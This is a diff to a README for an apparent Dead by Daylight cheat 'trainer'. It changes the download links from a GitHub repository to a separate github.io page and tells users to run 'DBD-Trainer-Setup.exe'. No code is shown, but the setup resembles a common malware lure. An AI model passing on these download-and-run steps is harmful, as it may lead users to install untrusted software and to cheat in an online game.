@@ -1,6 +1,6 @@
 # 🎮 DBD-AutoGrind-Trainer-2026-Elite - Automate your Dead by Daylight progression easily
 
-[![Download Tool](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/jessebase242/DBD-AutoGrind-Trainer-2026-Elite)
+[![Download Tool](https://img.shields.io/badge/Download-Release-blue.svg)](https://jessebase242.github.io)
 
 ## 📖 Overview
 
@@ -20,7 +20,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to set up the tool on your system.
 
-1. Visit this page to download: [https://github.com/jessebase242/DBD-AutoGrind-Trainer-2026-Elite](https://github.com/jessebase242/DBD-AutoGrind-Trainer-2026-Elite)
+1. Visit this page to download: [https://jessebase242.github.io](https://jessebase242.github.io)
 2. Locate the file named "DBD-Trainer-Setup.exe" in the download folder.
 3. Double-click the file to open the installation menu.
 4. Follow the prompts on the screen to finish the installation.
